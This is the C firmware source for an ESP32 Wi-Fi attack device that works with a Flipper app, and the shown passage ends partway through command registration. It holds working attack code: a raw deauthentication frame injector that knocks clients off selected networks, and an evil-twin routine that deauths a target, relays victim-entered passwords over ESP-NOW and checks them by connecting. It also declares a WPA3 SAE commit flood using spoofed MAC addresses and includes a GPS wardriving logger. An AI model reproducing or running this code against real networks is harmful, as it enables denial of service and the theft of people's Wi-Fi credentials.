// main.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/stat.h>
#include <unistd.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_system.h"
#include "esp_log.h"
#include "esp_err.h"

#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_event.h"

#include "esp_now.h"
#include "esp_mac.h"

#include "esp_console.h"
#include "argtable3/argtable3.h"

#include "driver/uart.h"
#include "driver/sdmmc_host.h"
#include "driver/sdspi_host.h"
#include "driver/spi_master.h"
#include "esp_vfs_fat.h"
#include "sdmmc_cmd.h"

#include "driver/gpio.h"

#include "led_strip.h"

#include "esp_random.h"
#include "mbedtls/ecp.h"
#include "mbedtls/bignum.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "esp_timer.h"

#define NEOPIXEL_GPIO      27
#define LED_COUNT          1
#define RMT_RES_HZ         (10 * 1000 * 1000)  // 10 MHz

// GPS UART pins (Marauder compatible)
#define GPS_UART_NUM       UART_NUM_1
#define GPS_TX_PIN         13
#define GPS_RX_PIN         14
#define GPS_BUF_SIZE       1024

// SD Card SPI pins (Marauder compatible)
#define SD_MISO_PIN        2
#define SD_MOSI_PIN        7  
#define SD_CLK_PIN         6
#define SD_CS_PIN          10

#define MY_LOG_INFO(tag, fmt, ...) printf("[INFO] " fmt "\n", ##__VA_ARGS__)

#define MAX_AP_CNT 64


static const char *TAG = "projectZero";

// GPS data structure
typedef struct {
    float latitude;
    float longitude;
    float altitude;
    float accuracy;
    bool valid;
} gps_data_t;

// Wardrive state
static bool wardrive_active = false;
static int wardrive_file_counter = 1;
static gps_data_t current_gps = {0};

// Wardrive buffers (static to avoid stack overflow)
static char wardrive_gps_buffer[GPS_BUF_SIZE];
static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];

//Target (ESP32) MAC of the other device (ESP32):
uint8_t esp32_mac[] = {0x28, 0x37, 0x2F, 0x5F, 0xC3, 0x18};


/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}


enum ApplicationState {
    DEAUTH,
    DEAUTH_EVIL_TWIN,
    EVIL_TWIN_PASS_CHECK,
    IDLE,
    DRAGON_DRAIN,
    SAE_OVERFLOW
};

volatile enum ApplicationState applicationState = IDLE;

static wifi_ap_record_t g_scan_results[MAX_AP_CNT];
static uint16_t g_scan_count = 0;

static int g_selected_indices[MAX_AP_CNT];
static int g_selected_count = 0;

char * evilTwinSSID = NULL;
char * evilTwinPassword = NULL;
int connectAttemptCount = 0;
led_strip_handle_t strip;


// Methods forward declarations
static int cmd_scan_networks(int argc, char **argv);
static int cmd_select_networks(int argc, char **argv);
static int cmd_start_evil_twin(int argc, char **argv);
static int cmd_start_wardrive(int argc, char **argv);
static int cmd_reboot(int argc, char **argv);
static esp_err_t do_scan_and_store(void);
static void print_scan_results(void);
static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
// Wardrive functions
static esp_err_t init_gps_uart(void);
static esp_err_t init_sd_card(void);
static bool parse_gps_nmea(const char* nmea_sentence);
static void get_timestamp_string(char* buffer, size_t size);
static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
static bool wait_for_gps_fix(int timeout_seconds);
static int find_next_wardrive_file_number(void);
// SAE WPA3 attack methods forward declarations:
//add methods declarations below:
static void startRandomMacSaeClientOverflow(const wifi_ap_record_t ap_record);
static void inject_sae_commit_frame();
static void prepareAttack(const wifi_ap_record_t ap_record);
static void update_spoofed_src_random(void);
static int crypto_init(void);
static int trng_random_callback(void *ctx, unsigned char *output, size_t len);
void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type);
static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt);

//add variables declarations below:
//SAE properties:
static int frame_count = 0;
static int64_t start_time = 0;

#define NUM_CLIENTS 20


/* --- mbedTLS Crypto --- */
static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
static mbedtls_mpi ecc_scalar;             // bieżący skalar
static mbedtls_ctr_drbg_context ctr_drbg; 
static mbedtls_entropy_context entropy;

/* Router BSSID */
static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};

char * anti_clogging_token = NULL; // Anti-Clogging Token, if any
int actLength = 0; // Length of the Anti-Clogging Token

/* Spoofing base address. Each frame modifies last byte of the address to create a unique source address.*/
static const uint8_t base_srcaddr[6] = { 0x76, 0xe5, 0x49, 0x85, 0x5f, 0x71 };

static uint8_t spoofed_src[6];  // really spoofed source address
static int next_src = 0;        // spoofing index


static const uint8_t auth_req_sae_commit_header[] = {
    0xb0, 0x00, 0x00, 0x00,                   // Frame Control & Duration
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 1 (BSSID – placeholder)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,         // Address 2 (Source – placeholder)
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,         // Address 3 (BSSID – placeholder)
    0x00, 0x00,                               // Sequence Control
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00  // SAE Commit fixed part
};

#define AUTH_REQ_SAE_COMMIT_HEADER_SIZE (sizeof(auth_req_sae_commit_header))


int framesPerSecond = 0;

// END of SAE properties








static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data);

static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status);

static esp_err_t wifi_init_ap_sta(void);
static esp_err_t espnow_init(void);
static void register_commands(void);

// --- Wi-Fi event handler ---
static void wifi_event_handler(void *event_handler_arg,
                               esp_event_base_t event_base,
                               int32_t event_id,
                               void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_STA_CONNECTED: {
            const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
            ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                     (const char*)e->ssid, e->channel,
                     e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
            MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            //const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            MY_LOG_INFO(TAG, "WiFi scan delay completed.");
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_STA_DISCONNECTED: {
            const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
            ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                     (const char*)e->ssid, (int)e->reason);
            if (applicationState == EVIL_TWIN_PASS_CHECK) {
                ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                if (connectAttemptCount >= 3) {
                    ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                    applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
                } else {
                    ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                    connectAttemptCount++;
                    esp_wifi_connect();
                }
            } else {
                ESP_LOGW(TAG, "Set app state to IDLE");
                applicationState = IDLE;
            }
            break;
        }
        default:
            break;
        }
    }
}

// --- ESP-NOW callbacks ---
static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
    char msg[len + 1];
    memcpy(msg, data, len);
    msg[len] = '\0';

    evilTwinPassword = malloc(len + 1);
    if (evilTwinPassword != NULL) {
        strcpy(evilTwinPassword, msg);
    } else {
        ESP_LOGW(TAG,"Malloc error 4 password");
    }

    MY_LOG_INFO(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
             recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
             recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
    MY_LOG_INFO(TAG, "Message: %s", msg);

    //Now, let's check if it's a password for Evil Twin:
    applicationState = EVIL_TWIN_PASS_CHECK;

    //set up STA properties and try to connect to a network:
    wifi_config_t sta_config = { 0 };  
    strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
    strncpy((char *)sta_config.sta.password, msg, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    vTaskDelay(pdMS_TO_TICKS(2000));
    MY_LOG_INFO(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
    connectAttemptCount = 0;
    MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
    esp_wifi_connect();
}

static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
    const uint8_t *mac_addr = send_info->des_addr;
    MY_LOG_INFO(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
             mac_addr[0], mac_addr[1], mac_addr[2],
             mac_addr[3], mac_addr[4], mac_addr[5],
             status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
}

// --- Inicjalizacja Wi-Fi (STA, no connection yet) ---
static esp_err_t wifi_init_ap_sta(void) {
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    esp_netif_create_default_wifi_ap();
    esp_netif_create_default_wifi_sta();
    

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler,
                                                        NULL,
                                                        NULL));

    wifi_config_t wifi_config = { 0 };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));

    wifi_config_t mgmt_wifi_config = {
            .ap = {
                .ssid = "--",
                .ssid_len = 2,
                .password = "nevermind",
                .max_connection = 0,
                .authmode = WIFI_AUTH_WPA2_PSK
            },
        };

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &mgmt_wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    uint8_t mac[6];
    esp_err_t ret = esp_wifi_get_mac(WIFI_IF_STA, mac);

    if (ret == ESP_OK) {
        MY_LOG_INFO("MAC", "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        ESP_LOGE("MAC", "Failed to get MAC address");
    }

    return ESP_OK;
}

// --- Initialize ESP-NOW ---
static esp_err_t espnow_init(void) {
    
    ESP_ERROR_CHECK(esp_now_init());
    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));
    ESP_ERROR_CHECK(esp_now_register_send_cb(espnow_send_cb));


    esp_now_peer_info_t peer = {
        .peer_addr = {0},
        .channel = 1,
        .encrypt = false,
    };
    memcpy(peer.peer_addr, esp32_mac, 6);
    if (esp_now_add_peer(&peer) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to add peer");
    }
    return ESP_OK;
    MY_LOG_INFO(TAG, "Peer added");
}

// --- Auxiliary: scan and print ---
static esp_err_t do_scan_and_store(void) {
    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
    };
    MY_LOG_INFO(TAG, "USB Command Received: scan");
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true)); // blokujace

    g_scan_count = MAX_AP_CNT;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results));

    //uint16_t total = 0;
    //ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&total));
    //MY_LOG_INFO(TAG, "Found %u APs.", g_scan_count);
    return ESP_OK;
}

static void escape_csv_field(const char* input, char* output, size_t output_size) {
    if (!input || !output || output_size < 2) return;
    
    size_t input_len = strlen(input);
    size_t out_pos = 0;
    
    for (size_t i = 0; i < input_len && out_pos < output_size - 2; i++) {
        if (input[i] == '"') {
            if (out_pos < output_size - 3) {
                output[out_pos++] = '"';
                output[out_pos++] = '"';
            }
        } else {
            output[out_pos++] = input[i];
        }
    }
    output[out_pos] = '\0';
}

const char* authmode_to_string(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA/WPA2 Mixed";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2 Enterprise";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2/WPA3 Mixed";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI";
        default:
            return "Unknown";
    }
}


static void print_network_csv(int index, const wifi_ap_record_t* ap) {
    char escaped_ssid[64];
    escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
    
    MY_LOG_INFO(TAG, "\"%d\",\"%s\",\"%02X:%02X:%02X:%02X:%02X:%02X\",\"%d\",\"%s\",\"%d\",\"%s\"",
                (index + 1),
                escaped_ssid,
                ap->bssid[0], ap->bssid[1], ap->bssid[2],
                ap->bssid[3], ap->bssid[4], ap->bssid[5],
                ap->primary,
                authmode_to_string(ap->authmode),
                ap->rssi,
                ap->primary <= 14 ? "2.4GHz" : "5GHz");
    vTaskDelay(pdMS_TO_TICKS(50));
}



static void print_scan_results(void) {
    //MY_LOG_INFO(TAG,"Index  RSSI  Auth  Channel  BSSID              SSID");
    for (int i = 0; i < g_scan_count; ++i) {
        wifi_ap_record_t *ap = &g_scan_results[i];
        // MY_LOG_INFO(TAG,"%5d  %4d  %4d  %5d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
        //        i, ap->rssi, ap->authmode, ap->primary,
        //        ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //        ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //        (const char*)ap->ssid);
        // MY_LOG_INFO(TAG, "%-6d %-16s %02X:%02X:%02X:%02X:%02X:%02X   %-2d   %-4d   %s",
        //     (i+1),
        //     (const char*)ap->ssid,
        //     ap->bssid[0], ap->bssid[1], ap->bssid[2],
        //     ap->bssid[3], ap->bssid[4], ap->bssid[5],
        //     ap->primary,
        //     ap->rssi,
        //     ap->primary <= 14 ? "2.4GHz" : "5GHz");

        print_network_csv(i, ap);

    }
    MY_LOG_INFO(TAG, "Scan results printed.");
}

// --- CLI: commands ---
static int cmd_scan_networks(int argc, char **argv) {
    ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 255, 0));
    ESP_ERROR_CHECK(led_strip_refresh(strip));

    (void)argc; (void)argv;
    esp_err_t err = do_scan_and_store();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Scan failed: %s", esp_err_to_name(err));
        return 1;
    }
    ESP_ERROR_CHECK(led_strip_clear(strip));
    ESP_ERROR_CHECK(led_strip_refresh(strip));
    print_scan_results();
    return 0;
}

static int cmd_select_networks(int argc, char **argv) {
    if (argc < 2) {
        ESP_LOGW(TAG,"Syntax: select_networks <index1> [index2] ...");
        return 1;
    }
    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        idx--;//because flipper app uses indexes from 1
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Fuck it, index %d (out of bounds 0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"Man, first scan_networks.");
        return 1;
    }

    char buf[500];
    int len = snprintf(buf, sizeof(buf), "Selected Networks:\n");

    for (int i = 0; i < g_selected_count; ++i) {
        const wifi_ap_record_t* ap = &g_scan_results[g_selected_indices[i]];
        
        // Zakładam, że auth jest dostępne jako string w twojej strukturze, jeśli nie - zastąp odpowiednim polem lub stringiem.
        const char* auth = authmode_to_string(ap->authmode);

        // Formatowanie: SSID, BSSID, Channel, Auth
        len += snprintf(buf + len, sizeof(buf) - len, "%s, %02x:%02x:%02x:%02x:%02x:%02x, Ch%d, %s%s\n",
                        (char*)ap->ssid,
                        ap->bssid[0], ap->bssid[1], ap->bssid[2],
                        ap->bssid[3], ap->bssid[4], ap->bssid[5],
                        ap->primary, auth,
                        (i + 1 == g_selected_count) ? "" : "");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    MY_LOG_INFO(TAG, "%s", buf);
    vTaskDelay(pdMS_TO_TICKS(100));

    return 0;
}


int onlyDeauth = 0;

static int cmd_start_deauth(int argc, char **argv) {
    onlyDeauth = 1;
    return cmd_start_evil_twin(argc, argv);
}

static int cmd_start_sae_overflow(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;

   if (g_selected_count == 1) {

        applicationState = SAE_OVERFLOW;
        int idx = g_selected_indices[0];
        const wifi_ap_record_t *ap = &g_scan_results[idx];
        ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 255, 0, 0));
        ESP_ERROR_CHECK(led_strip_refresh(strip));
        MY_LOG_INFO(TAG,"Starting WPA3 SAE Overflow for SSID='%s' Auth=%d", (const char*)ap->ssid, ap->authmode);
        //Main loop of SAE frames sending is invoked from this method:
        startRandomMacSaeClientOverflow(*ap);
        //this will be invoked only in future when attack termination is addded to the projectL
        ESP_ERROR_CHECK(led_strip_clear(strip));
        ESP_ERROR_CHECK(led_strip_refresh(strip));
        MY_LOG_INFO(TAG,"SAE Overflow: finished attack. Reboot your board.");
    } else {
        vTaskDelay(pdMS_TO_TICKS(100));
        MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return 0;
}

/*
0) Sends the first network name over ESP-NOW to ESP32
1) Starts a stream of deauth pockets sent to all target networks. 
2) Listens for password to try over ESP-NOW
3) When password arrives, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;

    if (g_selected_count > 0) {

        applicationState = DEAUTH_EVIL_TWIN;

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        //send evil ssid to ESP32 via ESP-NOW
        if (!onlyDeauth) {
            char msg[100];
            sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(100));
            ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
        }

        MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
        for (int i = 0; i < g_selected_count; ++i) {
            int idx = g_selected_indices[i];
            wifi_ap_record_t *ap = &g_scan_results[idx];
            MY_LOG_INFO(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
        }
        //Main loop of deauth frames sending:
        while ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK)) {
            if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
                ESP_LOGD(TAG,"Evil twin: sending deauth frames to %d selected APs...", g_selected_count);        
                ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
                ESP_ERROR_CHECK(led_strip_refresh(strip));
                wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
                ESP_ERROR_CHECK(led_strip_clear(strip));
                ESP_ERROR_CHECK(led_strip_refresh(strip));
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        MY_LOG_INFO(TAG,"Evil twin: finished attack. Reboot your board.");
    } else {
        MY_LOG_INFO(TAG,"Evl twin: no selected APs (use select_networks).");
    }
    return 0;
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG,"Restart...");
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
    return 0;
}

static int cmd_start_wardrive(int argc, char **argv) {
    (void)argc; (void)argv;
    
    MY_LOG_INFO(TAG, "Starting wardrive mode...");
    
    // Initialize GPS UART
    esp_err_t ret = init_gps_uart();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX)", GPS_TX_PIN, GPS_RX_PIN);
    
    // Initialize SD card
    ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "SD card initialized on pins MISO:%d MOSI:%d CLK:%d CS:%d", 
                SD_MISO_PIN, SD_MOSI_PIN, SD_CLK_PIN, SD_CS_PIN);
    
    // Set LED to indicate wardrive mode
    ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 255, 255)); // Cyan
    ESP_ERROR_CHECK(led_strip_refresh(strip));
    
    // Find the next file number by scanning existing files
    wardrive_file_counter = find_next_wardrive_file_number();
    MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.csv", wardrive_file_counter);
    
    // Wait for GPS fix before starting
    MY_LOG_INFO(TAG, "Waiting for GPS fix...");
    if (!wait_for_gps_fix(120)) {  // Wait up to 60 seconds for GPS fix
        MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, continuing without GPS data");
    } else {
        MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f", 
                   current_gps.latitude, current_gps.longitude);
    }
    
    wardrive_active = true;
    MY_LOG_INFO(TAG, "Wardrive started. Press any key to stop.");
    
    // Main wardrive loop (runs until restart or user stops)
    int scan_counter = 0;
    while (wardrive_active) {
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm", 
                               current_gps.latitude, current_gps.longitude, 
                               current_gps.altitude, current_gps.accuracy);
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        // Scan WiFi networks
        wifi_scan_config_t scan_cfg = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 100,
            .scan_time.active.max = 300,
        };
        
        esp_wifi_scan_start(&scan_cfg, true);
        
        uint16_t scan_count = MAX_AP_CNT;
        esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        
        // Create filename (keep it simple for FAT filesystem)
        char filename[32];
        snprintf(filename, sizeof(filename), "/sdcard/w%d.csv", wardrive_file_counter);
        
        // Check if /sdcard directory is accessible
        struct stat st;
        if (stat("/sdcard", &st) != 0) {
            MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Open file for appending
        FILE *file = fopen(filename, "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to open file %s, errno: %d (%s)", filename, errno, strerror(errno));
            
            // Try creating file with different approach
            file = fopen(filename, "w");
            if (file == NULL) {
                MY_LOG_INFO(TAG, "Failed to create file %s, errno: %d (%s)", filename, errno, strerror(errno));
                vTaskDelay(pdMS_TO_TICKS(1000));
                continue;
            }
            MY_LOG_INFO(TAG, "Successfully created file %s", filename);
        }
        
        // Write header if file is new
        fseek(file, 0, SEEK_END);
        if (ftell(file) == 0) {
            fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
        }
        
        // Get timestamp
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        
        // Process scan results
        for (int i = 0; i < scan_count; i++) {
            wifi_ap_record_t *ap = &wardrive_scan_results[i];
            
            // Format MAC address
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            // Escape SSID for CSV
            char escaped_ssid[64];
            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
            
            // Get auth mode string
            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
            
            // Format line for Wiggle format
            char line[512];
            if (current_gps.valid) {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi,
                        current_gps.latitude, current_gps.longitude,
                        current_gps.altitude, current_gps.accuracy);
            } else {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi);
            }
            
            // Write to file and print to UART
            fprintf(file, "%s", line);
            printf("%s", line);
        }
        
        // Close file to ensure data is written
        fclose(file);
        
        if (scan_count > 0) {
            MY_LOG_INFO(TAG, "Logged %d networks to %s", scan_count, filename);
        }
        
        scan_counter++;
        
        // Check if user wants to stop (check console UART for any input)
        size_t console_available;
        uart_get_buffered_data_len(UART_NUM_0, &console_available);
        if (console_available > 0) {
            MY_LOG_INFO(TAG, "User input detected, stopping wardrive...");
            wardrive_active = false;
            // Clear the buffer
            uint8_t dummy;
            while (console_available-- > 0) {
                uart_read_bytes(UART_NUM_0, &dummy, 1, 0);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
    }
    
    // Clear LED
    ESP_ERROR_CHECK(led_strip_clear(strip));
    ESP_ERROR_CHECK(led_strip_refresh(strip));
    
    MY_LOG_INFO(TAG, "Wardrive stopped after %d scans. Last file: w%d.csv", scan_counter, wardrive_file_counter);
    return 0;
}

// --- Rejestracja komend w esp_console ---
static void register_commands(void)
{
    const esp_console_cmd_t scan_cmd = {
        .command = "scan_networks",
        .help = "Scans networks and prints results",
        .hint = NULL,
        .func = &cmd_scan_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));
    //MY_LOG_INFO(TAG, "Zarejestrowano komende: %s", scan_cmd.command);

    const esp_console_cmd_t select_cmd = {
        .command = "select_networks",
        .help = "Selects networks by indexes: select_networks 0 2 5",
        .hint = NULL,
        .func = &cmd_select_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_cmd));

    const esp_console_cmd_t start_cmd = {
        .command = "start_evil_twin",
        .help = "Starts Evil Twin attack.",
        .hint = NULL,
        .func = &cmd_start_evil_twin,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));

    const esp_console_cmd_t deauth_cmd = {
        .command = "start_deauth",
        .help = "Starts Deauth attack.",
        .hint = NULL,
        .func = &cmd_start_deauth,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));

       const esp_console_cmd_t sae_overflow_cmd = {
        .command = "sae_overflow",
